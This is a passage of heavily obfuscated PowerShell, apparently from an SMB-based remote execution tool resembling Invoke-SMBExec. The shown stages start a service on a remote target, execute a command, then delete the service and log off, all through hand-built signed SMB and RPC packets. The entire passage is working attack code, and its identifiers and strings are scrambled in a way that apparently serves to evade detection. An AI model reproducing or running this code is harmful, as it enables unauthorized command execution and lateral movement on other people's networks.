                        ${s`MB_cLi`eN`T_ST`A`gE`_next} = ("{0}{1}{4}{3}{2}"-f 'S','tart','eW','ic','Serv')
                    }

                    ("{1}{2}{0}" -f 'erviceW','Sta','rtS')
                    {
                    
                        if( (&("{2}{0}{1}{3}" -f'-VaRi','Ab','gET','Le')  814  ).vAlUe::"to`sTr`ing"(${SM`B_Cl`iEnT_R`ECEIvE}[112..115]) -eq ("{1}{3}{2}{0}" -f '0','00-','00-0','00-'))
                        {
                            &("{0}{1}{2}" -f'Write-V','er','bose') ('S'+'ervi'+'ce '+"$SMB_service "+'crea'+'t'+'ed '+'o'+'n '+"$Target")
                            ${s`MB_serv`IC`e_`coN`T`eX`T_HAnDLe} = ${sMb_c`L`IeNt_rE`cEi`VE}[92..111]
                            ${pAckET_Sm`B`_heA`d`ER} = &("{1}{2}{4}{5}{3}{0}"-f'der','G','e','SMBHea','t-P','acket') 0x2f 0x18 0x05,0x28 ${smb_t`REE`_Id} ${P`R`Oces`S_`iD`_bYtEs} ${Smb`_uSE`R_`iD}

                            if(${SM`B_si`G`NinG})
                            {
                                ${pa`cK`Et_smB`_hea`D`ER}[("{2}{3}{1}{0}" -f 'gs2','er_Fla','SMBHea','d')] = 0x05,0x48
                                ${s`Mb_sI`GNIng`_C`oUNt`Er} = ${SMB_Si`GNING`_Cou`NTeR} + 2 
                                [Byte[]]${smB_SI`GNIN`G_SEQ`UEn`CE} =  (  &("{0}{1}{2}"-f'VAri','aB','Le') ("8"+"14")).VAluE::("{1}{2}{0}"-f 's','G','etByte').Invoke(${Smb_`Sig`N`InG`_c`OunteR}) + 0x00,0x00,0x00,0x00
                                ${pa`C`ket_S`Mb_h`eadEr}[("{3}{0}{1}{2}" -f'er','_Sig','nature','SMBHead')] = ${s`Mb`_`SIGnInG_Se`qUE`NcE}
                            }

                            ${PAcKe`T_Scm_D`ATA} = &("{1}{0}{2}{3}{5}{4}{7}{6}"-f'Pa','Get-','cke','tSCMSt','tServic','ar','W','e') ${s`MB`_`s`ervI`C`e`_contexT_HANDLE}
                            ${sC`M`_dATA} = &("{7}{0}{2}{9}{4}{3}{1}{5}{8}{6}"-f 'e','c','rtFr','OrderedDi','et','t','nary','Conv','io','om-Pack') ${pa`ckET`_`sc`M_DATa}
                            ${pAC`ket_r`PC_`dATa} = &("{1}{2}{3}{0}"-f 'tRPCRequest','Get','-','Packe') 0x03 ${SCm_D`A`Ta}."LEN`GTH" 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            ${R`pc`_dA`Ta} = &("{1}{3}{2}{5}{0}{6}{4}"-f'D','ConvertF','cketOrdere','rom-Pa','nary','d','ictio') ${PA`ck`et_r`Pc_dAtA}
                            ${SM`B_H`EAdER} = &("{0}{1}{7}{4}{6}{9}{5}{3}{10}{8}{2}" -f 'C','onv','ry','edDicti','om-Pac','rder','ke','ertFr','na','tO','o') ${PAcKe`T_smb`_HeA`dEr}   
                            ${pA`c`kEt_smb`_`DATA} = &("{2}{0}{3}{1}{5}{4}"-f 't-Pa','ketSM','Ge','c','WriteAndXRequest','B') ${sM`B_`FID} (${rP`C_`daTa}."l`EN`GTh" + ${sCm`_Da`TA}."L`en`gTh")
                            ${SmB_d`ATA} = &("{2}{5}{0}{4}{1}{3}{9}{7}{6}{8}"-f'-Pack','e','Convert','d','etOrder','From','nar','tio','y','Dic') ${Pac`KET_SM`B`_`DATa}
                             
                            ${Rp`C_daTa`_`Len`GTH} = ${s`Mb_`DaTa}."LE`NGTH" + ${sc`m_`d`Ata}."len`GTh" + ${r`pC_d`ATa}."Le`NGTH"
                            ${pACKeT`_NetBI`oS_SeS`s`IoN_s`ERViCe} = &("{6}{5}{4}{2}{0}{3}{1}" -f'N','ervice','Packet','etBIOSSessionS','-','t','Ge') ${s`Mb`_he`ADeR}."lEng`Th" ${R`pC_`dATA_`LENgTh}
                            ${nETBio`s_`S`esSI`oN_S`erVicE} = &("{4}{5}{0}{2}{1}{3}"-f'ck','dDi','etOrdere','ctionary','ConvertF','rom-Pa') ${P`AC`ket_nETB`iOS_SEsSio`N_`ServICe}

                            if(${smB`_s`IgNi`Ng})
                            {
                                ${sM`B`_sign} = ${sEss`IoN`_KEy} + ${sM`B`_hea`deR} + ${s`MB_dAta} + ${rp`C`_daTa} + ${Scm_`D`ATA}
                                ${Sm`B_SI`gNA`T`URE} = ${M`D5}."c`o`MputEhaSh"(${s`mb_`sIgn})
                                ${s`Mb_`s`IGNA`TuRE} = ${sm`B`_S`Ig`NATUre}[0..7]
                                ${PaCKE`T_SMb_`h`eAD`ER}[("{3}{5}{0}{4}{1}{2}" -f 'nat','r','e','SMBHead','u','er_Sig')] = ${s`Mb`_SigN`ATure}
                                ${SmB_`he`ADeR} = &("{2}{4}{9}{6}{5}{8}{3}{7}{0}{1}"-f 'a','ry','Con','io','vertFrom','ere','Ord','n','dDict','-Packet') ${packE`T_sMB`_he`AD`Er}
                            }

                            ${SM`B_cLieNT_`SE`ND} = ${NeTbi`Os_`sE`ssio`N_sERVice} + ${smB_H`eAd`Er} + ${sMb_D`A`Ta} + ${RPc`_`DatA} + ${s`cM_`DatA}
                            &("{2}{1}{0}" -f 'rbose','-Ve','Write') ('Tr'+'ying'+' '+'t'+'o '+'execu'+'te'+' '+'comm'+'and '+'o'+'n '+"$Target")
                            ${smb`_Cl`IE`Nt_`sTReaM}.("{1}{0}"-f 'te','Wri').Invoke(${SM`B`_c`L`iENT_`sEND},0,${S`Mb_`cLient_S`EnD}."LEN`g`Th") > ${N`Ull}
                            ${S`mB`_cLIent_s`T`R`eAm}.("{1}{0}" -f 'h','Flus').Invoke()
                            ${SM`B_cLiEnt`_Stre`AM}.("{1}{0}" -f 'ad','Re').Invoke(${SMB_cL`I`En`T_`ReC`eivE},0,${SM`B_cL`ieNT`_ReCeivE}."leN`G`Th") > ${NU`lL}
                            ${sMb_cL`i`EnT`_stAGe} = ("{2}{1}{0}{3}"-f'XReques','dAnd','Rea','t')
                            ${S`mb_C`L`IeNt_Stag`E_`NExt} = ("{0}{2}{1}"-f'DeleteServi','W','ce')  
                        }
                        elseif( ( &("{1}{0}" -f'i','gc')  ("{2}{0}{1}{3}"-f'I','aB','VAr','Le:814')  ).VALue::"tO`StriNG"(${SMb`_CLIeN`T`_R`eCE`iVE}[112..115]) -eq ("{3}{0}{1}{2}" -f'1-04','-00-','00','3'))
                        {
                            &("{0}{2}{1}" -f'Wri','t','te-Outpu') ('Se'+'r'+'vice '+"$SMB_service "+'cr'+'eatio'+'n '+'fa'+'iled'+' '+'o'+'n '+"$Target")
                            ${sM`BEXE`c`_`FaILED} = ${tr`UE}
                        }
                        else
                        {
                            &("{2}{1}{0}" -f'put','te-Out','Wri') ("{5}{0}{4}{1}{2}{7}{3}{6}" -f 'eatio','l','t cont','m','n fau','Service cr','ismatch','ext ')
                            ${s`M`B`exEc_FaIL`ED} = ${Tr`UE}
                        }
    
                    }
                
                    ("{2}{0}{1}{3}"-f'le','teService','De','W')
                    { 

                        if(  ( &("{3}{1}{0}{2}"-f 'a','i','BLE','GeT-VAr')  814 -vALu)::"To`stri`Ng"(${s`MB_cLI`ent`_reCeiVe}[88..91]) -eq ("{0}{2}{1}" -f'1d-','-00','04-00'))
                        {
                            &("{2}{0}{1}" -f'ite-Outp','ut','Wr') ('Com'+'m'+'and '+'e'+'xecuted'+' '+'w'+'ith '+'se'+'rvic'+'e '+"$SMB_service "+'o'+'n '+"$Target")
                        }
                        elseif(  (&("{0}{1}{2}" -f 'geT','-vaRi','AbLe')  ('8'+'14')  -VaLuEO )::"T`OStrI`NG"(${SmB`_ClI`enT_RECei`Ve}[88..91]) -eq ("{0}{2}{1}"-f '02','00','-00-00-'))
                        {
                            &("{2}{0}{3}{1}"-f't','put','Wri','e-Out') ('Service'+' '+"$SMB_service "+'f'+'ailed'+' '+'to'+' '+'sta'+'rt '+'o'+'n '+"$Target")
                        }

                        ${PAcKeT_sMb_`hE`AD`er} = &("{0}{2}{1}{3}"-f'Get-PacketS','Heade','MB','r') 0x2f 0x18 0x05,0x28 ${SmB_`T`REE_Id} ${pR`Oc`eS`S_ID`_BYtEs} ${SMb`_U`SeR_`Id}

                        if(${Smb_`sIGN`ING})
                        {
                            ${P`AC`kE`T`_SmB_H`EaDeR}[("{1}{4}{0}{2}{3}"-f 'l','SMBHead','a','gs2','er_F')] = 0x05,0x48
                            ${SM`B_`sig`NiNg_coUnt`Er} = ${SMb`_sIgn`iNG`_cOunT`er} + 2 
                            [Byte[]]${sMB_Sig`Ni`NG_S`e`QUEnCe} =   (  &("{0}{1}"-f'iT','EM')  ("{2}{1}{0}"-f'814','IabLE:','Var') ).value::("{0}{2}{1}"-f 'GetBy','es','t').Invoke(${SmB_S`ig`NIn`g_COuNteR}) + 0x00,0x00,0x00,0x00
                            ${p`AcKet`_SMB_h`EAdER}[("{5}{3}{1}{4}{0}{2}" -f'u','gna','re','der_Si','t','SMBHea')] = ${SMB_sIgnI`NG_s`e`QUEn`ce}
                        }

                        ${pACkE`T_`Scm_DA`TA} = &("{5}{3}{0}{1}{4}{2}" -f 'MDe','leteSe','iceW','ketSC','rv','Get-Pac') ${SMB_seRvIc`E`_c`ON`TeX`T_H`ANdLe}
                        ${s`CM_DAtA} = &("{8}{4}{0}{7}{1}{9}{5}{2}{3}{6}{10}"-f'om-P','tO','ic','t','tFr','D','ionar','acke','Conver','rdered','y') ${packe`T`_SCm_`DA`Ta}
                        ${Pa`CKET_Rp`c_DA`Ta} = &("{2}{3}{0}{1}{4}"-f'etRPCR','e','Get-Pac','k','quest') 0x03 ${SCM_D`ATA}."lEN`GTH" 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        ${RpC_`dAtA} = &("{4}{6}{0}{7}{1}{3}{5}{2}"-f 'e','O','ictionary','rd','ConvertF','eredD','rom-Pack','t') ${P`AcKet_`RP`c_d`ATA}
                        ${SMb_h`e`A`dER} = &("{3}{8}{7}{6}{4}{2}{0}{1}{5}" -f 'dD','icti','ere','Conve','tOrd','onary','om-Packe','tFr','r') ${P`AcK`Et_sMB_H`eader}   
                        ${p`Ac`K`et`_sMB_DATa} = &("{5}{6}{4}{1}{0}{2}{3}" -f'eA','SMBWrit','ndXR','equest','et','Get','-Pack') ${S`mB_FiD} (${rP`c_`Data}."Le`N`gth" + ${S`CM_d`A`TA}."L`enGth")
                        ${Smb_D`ATA} = &("{8}{1}{2}{0}{3}{5}{7}{9}{4}{6}{10}" -f 'm','nve','rtFro','-Packet','na','O','r','rderedDict','Co','io','y') ${pac`kET`_SMB_`DA`Ta} 
                        ${rpC_DAt`A`_`leng`TH} = ${s`Mb`_Data}."lE`NGth" + ${SCM`_DAtA}."lE`NGTh" + ${R`pc_`DATA}."LenG`Th"
                        ${P`Ac`ket`_Ne`TB`I`oS`_SES`Sion_se`RViCe} = &("{0}{2}{4}{3}{1}{5}" -f 'Get','etBIOSSessionServ','-P','N','acket','ice') ${s`MB`_h`eADEr}."LE`NG`Th" ${r`pc_DaTa`_`Le`NGTh}
                        ${NETbIos_sESS`IOn`_se`R`VIce} = &("{6}{1}{4}{2}{8}{7}{5}{0}{3}" -f'icti','ertFro','acket','onary','m-P','D','Conv','ed','Order') ${PAC`Ket_neTbi`os_`s`eSSion_`sErvICe}

                        if(${smb`_s`IGnIng})
                        {
                            ${S`MB`_Sign} = ${s`ess`IOn`_keY} + ${s`m`B_`heaDer} + ${s`mB_d`Ata} + ${rPC`_Da`TA} + ${scM_`d`ATA}
                            ${Smb`_sig`NATu`Re} = ${M`d5}."com`PutEh`ASh"(${Sm`B_si`gn})
                            ${SmB`_si`gNaT`UrE} = ${S`MB_siGNa`T`UrE}[0..7]
                            ${PAC`KeT_`sMb_`HeAdER}[("{5}{2}{1}{4}{0}{3}"-f 'Sig','er','ad','nature','_','SMBHe')] = ${s`Mb_`sIgNA`TU`RE}
                            ${SMB_HE`A`D`er} = &("{3}{7}{2}{5}{1}{4}{0}{6}" -f'Dictionar','tOrde','From-P','Conver','red','acke','y','t') ${Pa`c`keT`_SMb_HE`ADER}
                        }

                        ${smB_C`lI`ENT`_S`enD} = ${N`e`TBI`o`s_seSSio`N_S`ERvicE} + ${S`mb_HEAd`er} + ${s`MB`_DaTA} + ${R`Pc_DA`Ta} + ${sc`m`_D`AtA}

                        ${sMb_`cL`I`en`T_STream}.("{0}{1}" -f 'Wr','ite').Invoke(${s`MB_CL`iEnt_S`end},0,${smb_ClIE`Nt`_s`EnD}."LenG`Th") > ${NU`ll}
                        ${Smb_c`li`e`Nt_st`REaM}.("{0}{1}"-f'Flu','sh').Invoke()
                        ${SMB_`C`liE`N`T_STrEAM}.("{0}{1}"-f 'Rea','d').Invoke(${smB_`cLi`ENt_rECEI`Ve},0,${sm`B_cLIEnt_`Re`Ceive}."LE`NgTh") > ${Nu`ll}
                        ${smb`_`cL`IEN`T_S`TagE} = ("{4}{1}{2}{3}{0}"-f'equest','eadAnd','X','R','R')
                        ${smb_cLi`En`T_S`T`Age`_neXT} = ("{1}{4}{3}{5}{2}{0}" -f 'andle','Cl','erviceH','s','o','eS')
                        ${S`mB_`Cl`os`e_seRviCE_HaND`LE_`St`AGE} = 1
                    }

                    ("{0}{3}{1}{2}"-f'Clos','an','dle','eServiceH')
                    {
                        if(${s`MB`_cLose_sE`RVI`CE_HA`Ndle_StAgE} -eq 1)
                        {
                            &("{2}{1}{3}{0}{4}"-f'Verbo','i','Wr','te-','se') ('Ser'+'vice '+"$SMB_service "+'d'+'ele'+'ted '+'o'+'n '+"$Target")
                            ${SMB_`cLO`S`e_SeR`VI`ce_hANDLE`_Sta`ge}++
                            ${P`AcKEt_S`C`M_da`Ta} = &("{4}{0}{1}{5}{3}{7}{6}{2}"-f 'e','t-Packe','dle','S','G','t','Han','CMCloseService') ${sMb_`SErv`IC`E_CONt`ext_ha`NdLE}
                        }
                        else
                        {
                            ${sm`B_cLI`eNt_s`TAGE} = ("{0}{1}{2}" -f 'CloseReq','ues','t')
                            ${pA`CkEt_sC`m`_D`Ata} = &("{4}{0}{2}{3}{1}{5}"-f'-P','dl','acket','SCMCloseServiceHan','Get','e') ${S`mB_`Serv`Ic`E`_MA`NAGER_coNtex`T_HA`N`D`Le}
                        }
                        ${PA`CKE`T_`s`mb`_hEADEr} = &("{4}{2}{0}{1}{3}"-f'Packet','SMBHead','t-','er','Ge') 0x2f 0x18 0x05,0x28 ${smb_TreE`_`id} ${PRocES`s`_I`d`_BYTEs} ${smb_`U`SE`R_ID}

                        if(${smB_`sIGni`Ng})
                        {
                            ${Pa`cke`T_`s`Mb_hEADer}[("{4}{1}{3}{0}{2}" -f'g','d','s2','er_Fla','SMBHea')] = 0x05,0x48
                            ${s`m`B_SigNiNG_`cOu`NTER} = ${SmB`_`SIGnI`NG_cO`UNtER} + 2 
                            [Byte[]]${s`Mb`_S`iGnINg`_SEq`UEnCE} =   (  &('Gi') ("{0}{1}{2}" -f'VAR','iABLE:81','4')).vALUE::("{1}{2}{0}"-f'tes','G','etBy').Invoke(${smb_si`GN`Ing_C`oUN`TEr}) + 0x00,0x00,0x00,0x00
                            ${PacK`e`T_s`mb`_hEAD`ER}[("{3}{0}{1}{2}"-f 'MBHe','ad','er_Signature','S')] = ${smb_`sIGN`iNG`_se`q`UeNCE}
                        }

                        ${SC`m_Da`TA} = &("{7}{2}{3}{0}{5}{4}{6}{1}" -f '-Pac','ctionary','er','tFrom','Ordered','ket','Di','Conv') ${pac`kET_`Scm_d`ATA}
                        ${Pac`keT_Rp`C_datA} = &("{0}{2}{3}{1}"-f'Get-Packet','quest','RP','CRe') 0x03 ${sc`m_`DaTa}."LenG`Th" 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${RPc_Da`Ta} = &("{6}{1}{5}{2}{3}{0}{4}"-f'OrderedDictiona','er','rom-Packe','t','ry','tF','Conv') ${pAcK`et`_RpC`_dA`TA}
                        ${s`m`B_HEADEr} = &("{9}{0}{2}{4}{8}{6}{10}{5}{7}{1}{3}"-f'nv','a','er','ry','tFr','Di','rder','ction','om-PacketO','Co','ed') ${PaCKeT_`Sm`B`_`h`EAdEr}   
                        ${pa`cKE`T_S`MB_DATa} = &("{4}{0}{5}{1}{2}{3}" -f 'PacketSMBWr','eAndX','Re','quest','Get-','it') ${s`MB_F`ID} (${RP`C_datA}."l`ENgTh" + ${SCm_d`A`TA}."Le`NGtH")
                        ${sMb_D`A`Ta} = &("{4}{6}{1}{3}{0}{2}{5}"-f 'tOr','nvert','deredDic','From-Packe','C','tionary','o') ${Pac`kET`_SmB_`DA`Ta}
                        ${rP`c`_`da`Ta_L`EnGth} = ${SM`B`_D`ATa}."LE`NgTH" + ${s`c`M_Data}."LEng`TH" + ${Rpc`_dA`TA}."LE`NG`Th"
                        ${pACKeT_n`etb`i`o`S_s`Es`sioN`_S`ErVi`CE} = &("{5}{1}{4}{3}{2}{0}" -f 'ce','cketNe','ervi','ionS','tBIOSSess','Get-Pa') ${SmB`_he`Ad`Er}."lEN`gTH" ${rPC`_datA_le`NgTh}
                        ${NeTBi`OS_SeSSIO`N_`S`ERV`iCe} = &("{4}{9}{5}{2}{8}{0}{3}{7}{6}{1}" -f'd','ry','e','er','Conve','From-Pack','Dictiona','ed','tOr','rt') ${p`A`Cket_NE`T`BIos_Session`_SeRVice}

                        if(${S`mb_`SIgNi`Ng})
                        {
                            ${s`m`B_sIgN} = ${SE`SSIon_k`EY} + ${SMB`_`HE`AdEr} + ${S`Mb_Da`TA} + ${Rp`c_d`ATa} + ${s`cM`_DaTa}
                            ${smB_`s`IG`Na`TurE} = ${m`D5}."coMp`Ute`HaSh"(${SMb`_sI`gn})
                            ${s`MB_`Sig`NA`TURE} = ${s`mB_SI`g`Nature}[0..7]
                            ${pA`cKET_`sMb_`heAder}[("{0}{3}{2}{4}{1}" -f 'SMBHea','re','er_Sig','d','natu')] = ${sMB_`sIgN`A`TURe}
                            ${s`mB_`HeaDEr} = &("{3}{7}{5}{4}{1}{8}{2}{6}{0}" -f'onary','rom-Pa','tOrdere','Co','tF','er','dDicti','nv','cke') ${PACkEt`_Sm`B_`head`ER}
                        }

                        ${SMb`_c`LI`Ent`_SeNd} = ${NetBIOS`_`SessiO`N`_s`E`RvicE} + ${s`m`B_heaD`eR} + ${sm`B_D`AtA} + ${rp`c`_DAtA} + ${ScM`_DA`Ta}
                        ${SMb_CL`i`ent_`sT`REAm}.("{0}{1}" -f 'Wr','ite').Invoke(${sMB_cli`enT`_sE`ND},0,${sMB`_ClIE`NT_sEND}."L`engtH") > ${N`ULl}
                        ${S`Mb_`Cli`E`NT_stRe`Am}.("{1}{0}"-f'ush','Fl').Invoke()
                        ${sM`B_cLie`NT`_sT`R`Eam}.("{0}{1}" -f'R','ead').Invoke(${S`MB_clIeNT_REc`ei`VE},0,${sMB_c`lI`ENT_RE`ce`I`Ve}."lEng`TH") > ${NU`Ll}
                    }

                    ("{0}{2}{3}{1}"-f 'Clo','t','seReq','ues')
                    {
                        ${pA`cK`et_Sm`B_hE`ADEr} = &("{0}{1}{2}{3}" -f'Ge','t-','PacketS','MBHeader') 0x04 0x18 0x07,0xc8 ${Smb`_t`Ree_`id} ${pr`Oc`EsS`_iD_BytEs} ${SM`B`_uSer_`id}

                        if(${sMB`_`sIgNiNg})
                        {
                            ${pAC`K`ET_SMB_h`EAder}[("{2}{1}{3}{0}"-f '2','der_Flag','SMBHea','s')] = 0x05,0x48
                            ${SM`B_s`igNIng`_`coUn`TEr} = ${sM`B_sIg`NInG_C`ounTeR} + 2
                            [Byte[]]${smB_`SIG`N`inG_SEQ`Ue`N`ce} =   ${8`14}::("{2}{1}{0}"-f 'ytes','etB','G').Invoke(${SMB_`SigN`i`Ng_cOun`TEr}) + 0x00,0x00,0x00,0x00
                            ${PAC`K`E`T_SmB`_`heaDer}[("{1}{3}{2}{0}"-f 'ure','SMBHeader_','at','Sign')] = ${SM`B_S`ig`NINg_Seq`UEnCE}
                        }

                        ${S`M`B_H`EADeR} = &("{7}{0}{4}{3}{5}{6}{2}{1}"-f 'o','tionary','c','vertFrom-PacketOrder','n','e','dDi','C') ${P`A`CK`Et`_Smb_h`Eader}   
                        ${Packet_`SMB_D`ATA} = &("{6}{0}{2}{5}{4}{3}{1}"-f'e','seRequest','t-Packet','o','MBCl','S','G') 0x00,0x40
                        ${Smb`_d`ATA} = &("{3}{1}{2}{0}{4}{5}"-f 'e','ertFr','om-PacketOrd','Conv','r','edDictionary') ${PaCke`T_S`mb`_`DATA}
                        ${pA`CKET_neT`BIoS`_sE`ssio`N`_sE`RVI`Ce} = &("{4}{0}{1}{5}{3}{2}{6}"-f'acke','t','IOSSessionServi','tB','Get-P','Ne','ce') ${Sm`B_HEad`Er}."LENG`TH" ${s`MB_d`AtA}."LeNg`Th"
                        ${Ne`Tb`ios_`sesSiO`N_S`E`RVI`ce} = &("{1}{5}{4}{0}{10}{6}{2}{3}{9}{8}{7}"-f 'tFrom','Conv','c','ketO','r','e','Pa','ictionary','dD','rdere','-') ${PACkEt_`N`e`T`BIO`S`_SEs`Si`on_`sErVICe}

                        if(${Sm`B_SI`Gning})
                        {
                            ${Sm`B_`sIGn} = ${se`SsIon_`k`Ey} + ${S`MB_H`eaDer} + ${sMB`_`d`Ata} 
                            ${sMb_`siG`NAtUre} = ${m`d5}."c`o`mpUTehash"(${s`mb`_siGn})
                            ${sMb_S`iG`N`A`TurE} = ${S`M`B_siGNaT`URe}[0..7]
                            ${PACkET_`SmB`_hE`AD`er}[("{2}{1}{3}{4}{0}"-f 'ture','MBH','S','eader_S','igna')] = ${s`MB`_s`iGnaTu`Re}
                            ${s`mb`_he`ADeR} = &("{6}{0}{5}{4}{2}{3}{1}" -f 'tF','y','rdere','dDictionar','cketO','rom-Pa','Conver') ${PacKEt_`smb_`h`EAder}
                        }

                        ${sM`B_CLIen`T_SE`ND} = ${netBI`os_S`eSsI`On_`sEr`ViCE} + ${SMB`_`HE`AdeR} + ${Smb`_da`TA}
                        ${SMb_`clIEN`T_s`T`REAm}.("{1}{0}" -f 'ite','Wr').Invoke(${sMB_clI`E`Nt`_s`end},0,${sm`B_`cLI`eNt`_sENd}."lE`NGth") > ${N`ULl}
                        ${sMb_cLIeNT`_sT`R`eaM}.("{0}{1}" -f 'Flus','h').Invoke()
                        ${SMb_`cli`en`T_S`T`ReAM}.("{1}{0}" -f 'ead','R').Invoke(${sM`B_cliEN`T_re`CEI`Ve},0,${sm`B_Clien`T_rEcEI`VE}."L`En`GTH") > ${nu`lL}
                        ${SmB_C`Li`ENt`_stAGe} = ("{1}{0}{3}{2}" -f'ee','Tr','connect','Dis')
                    }

                    ("{1}{0}{2}"-f 'eeD','Tr','isconnect')
                    {
                        ${p`AckEt`_sm`B_HEadeR} = &("{3}{2}{1}{0}"-f 'eader','SMBH','et','Get-Pack') 0x71 0x18 0x07,0xc8 ${SMb`_treE_`Id} ${p`Ro`cEsS_Id`_by`T`ES} ${SM`B_USeR_`id}

                        if(${Sm`B_SigN`inG})
                        {
                            ${pA`ckEt`_`s`mB_`hEaDeR}[("{0}{2}{3}{1}{4}"-f 'S','der_','MBHe','a','Flags2')] = 0x05,0x48
                            ${sMB_siG`NiN`g`_`co`UNTEr} = ${smb_S`I`G`Ni`NG_cOUNT`er} + 2
                            [Byte[]]${sMB_s`i`GNI`NG_`sEq`U`ENce} =  ( &("{1}{0}{2}"-f 'a','gET-vaRI','Ble') ('8'+'14')).vALuE::("{2}{0}{1}" -f 'e','tBytes','G').Invoke(${sm`B_S`iG`Ni`N`G_COUN`TER}) + 0x00,0x00,0x00,0x00
                            ${pacK`E`T_SMB_h`eaD`eR}[("{3}{2}{0}{1}{4}"-f'S','i','ader_','SMBHe','gnature')] = ${sMb_s`I`gni`N`G`_SEQUe`NcE}
                        }

                        ${SMb`_H`eAder} = &("{2}{0}{1}{3}{5}{4}{6}"-f'ert','From-','Conv','Pac','rd','ketO','eredDictionary') ${p`Ac`kEt_Sm`B_hEad`Er}   
                        ${Pac`keT`_SMB_D`Ata} = &("{2}{5}{4}{0}{6}{3}{1}" -f'isc','st','Get-','ue','eeD','PacketSMBTr','onnectReq')
                        ${SMb_D`ATA} = &("{1}{9}{6}{4}{8}{3}{2}{5}{0}{7}"-f 'ctio','C','de','PacketOr','Fr','redDi','nvert','nary','om-','o') ${PAckE`T`_SM`B_DatA}
                        ${PACket_neTbi`O`S_S`eS`si`On_S`ERV`iCe} = &("{4}{5}{1}{7}{0}{3}{2}{6}"-f 'OS','e','ession','S','Get-Pac','ketN','Service','tBI') ${sMB_He`Ad`er}."le`Ng`TH" ${Smb_`dA`Ta}."Le`Ngth"
                        ${netbIo`S_SEssI`On`_`s`ER`VIce} = &("{2}{5}{3}{0}{4}{1}{6}"-f'etO','dDictio','Con','rom-Pack','rdere','vertF','nary') ${p`A`c`KeT_NE`TbIoS`_sESSIO`N_`SerVIce}

                        if(${S`mB_s`IGNING})
                        {
                            ${smB_`S`Ign} = ${SeS`S`ion_`kEY} + ${sm`B`_HE`AdER} + ${s`Mb_`dATA} 
                            ${S`Mb_`sigNAT`URe} = ${M`d5}."CO`mP`U`TehAsh"(${sMB`_sI`gn})
                            ${S`MB_`SigNaTUre} = ${sMB_SIG`N`A`TuRe}[0..7]
                            ${PaCKEt`_sm`B`_`HEADEr}[("{2}{3}{1}{0}"-f'eader_Signature','H','SM','B')] = ${s`Mb_sIG`NA`T`URe}
                            ${sm`B_H`Eader} = &("{2}{6}{5}{4}{1}{3}{0}" -f'ionary','ere','C','dDict','acketOrd','rtFrom-P','onve') ${pAC`Ke`T`_s`mB_HeaD`eR}
                        }

                        ${s`Mb_cLIe`Nt_s`END} = ${Ne`TbI`o`S_sEss`i`o`N`_SErVice} + ${S`Mb_He`ADer} + ${Smb`_`dA`Ta}
                        ${sMB_CLIE`NT`_sT`R`EAm}.("{0}{1}" -f 'Wri','te').Invoke(${SMb`_cLiENt_`senD},0,${sMb`_ClIe`N`T`_sEnD}."le`NGTH") > ${Nu`lL}
                        ${Smb_CLI`en`T_St`REAM}.("{1}{0}"-f'lush','F').Invoke()
                        ${S`mB_cLIE`Nt_St`Ream}.("{0}{1}" -f'R','ead').Invoke(${S`mB_cLiEN`T_`Re`cEIVe},0,${smB_`c`l`i`enT_receiVe}."L`EnG`TH") > ${Nu`ll}
                        ${s`Mb_CLIENt`_`STAgE} = ("{0}{1}" -f'Log','off')
                    }

                    ("{0}{1}" -f'Logof','f')
                    {
                        ${paC`kEt_S`MB`_`Head`ER} = &("{3}{0}{1}{2}" -f'a','cketSMBHe','ader','Get-P') 0x74 0x18 0x07,0xc8 0x34,0xfe ${pRoCe`s`s_iD_byT`es} ${SmB_uS`Er`_`Id}

                        if(${SM`B_`SIG`Ning})
                        {
                            ${P`AckEt_Sm`B_hEa`dEr}[("{2}{0}{3}{1}" -f 'MBHe','r_Flags2','S','ade')] = 0x05,0x48
                            ${SmB_SIg`N`ING`_`cOUNtEr} = ${Smb_sIGn`I`N`g`_`CountER} + 2 
                            [Byte[]]${smB`_sI`GNI`N`G_sEQU`EnCe} =   ${8`14}::("{2}{1}{0}" -f 'tes','By','Get').Invoke(${S`MB`_siGNiNg_cOUNt`Er}) + 0x00,0x00,0x00,0x00
                            ${PaC`k`e`T_sMb_HeAD`Er}[("{1}{0}{5}{3}{4}{2}"-f'd','SMBHea','ature','Si','gn','er_')] = ${smB_sIgn`i`Ng_seqU`encE}
                        }

                        ${Smb_H`e`Ader} = &("{7}{0}{2}{6}{3}{4}{1}{5}"-f'm-Pac','ct','k','ered','Di','ionary','etOrd','ConvertFro') ${pAC`KEt_`S`MB_`HeAder}   
                        ${P`Ack`Et_`SMB_d`ATA} = &("{5}{0}{1}{2}{4}{6}{3}"-f 't-Pack','etSMBLogo','ff','t','AndXReq','Ge','ues')
                        ${S`M`B_dAtA} = &("{6}{3}{8}{0}{1}{4}{2}{5}{7}"-f'm','-Packe','edD','rtFr','tOrder','ictionar','Conve','y','o') ${pack`e`T_`sMB_DATa}
                        ${PacKEt_`Netb`IO`S`_`sESsIo`N_sErvI`ce} = &("{2}{7}{3}{8}{0}{1}{9}{5}{4}{6}" -f 'SS','es','G','NetBI','c','Servi','e','et-Packet','O','sion') ${smb`_HE`AD`er}."Le`N`gTH" ${S`mB_Da`Ta}."LeN`G`TH"
                        ${nEtbI`oS_SE`s`SI`oN_sERVI`ce} = &("{2}{0}{3}{1}{4}{5}" -f 'ertFrom-PacketOrder','dDi','Conv','e','ctio','nary') ${PAckEt`_netbIOS_s`EssIOn`_`sER`V`iCe}

                        if(${SMB`_sIg`NiNg})
                        {
                            ${S`M`B_SIgn} = ${Se`SsiO`N_`kEY} + ${s`M`B_he`AdeR} + ${S`Mb`_D`ATa} 
                            ${S`M`B_SIGnatURe} = ${M`d5}."CO`MP`UtEHash"(${s`MB_si`gN})
                            ${sMb`_SigNAtU`RE} = ${Smb_`sI`gn`ATure}[0..7]
                            ${Pac`ket_`sMB`_h`e`ADEr}[("{0}{1}{2}{3}" -f 'SMBHead','e','r_Signa','ture')] = ${SMB_SIGNA`T`U`Re}
                            ${sMB`_`HE`ADER} = &("{5}{4}{2}{0}{3}{1}" -f 'redDictiona','y','Orde','r','From-Packet','Convert') ${pACKeT_smB_`hE`AD`Er}
                        }

                        ${sm`B`_cLi`Ent_senD} = ${Ne`TBIOS_`SessION_sE`RV`iCE} + ${Sm`B_He`A`der} + ${sM`B_d`ATA}
                        ${s`MB`_cL`ien`T_STreAm}.("{1}{0}"-f 'ite','Wr').Invoke(${smB_`cl`i`ENt`_SEnd},0,${SMb_`CLIEnT`_SenD}."Le`Ngth") > ${nU`ll}
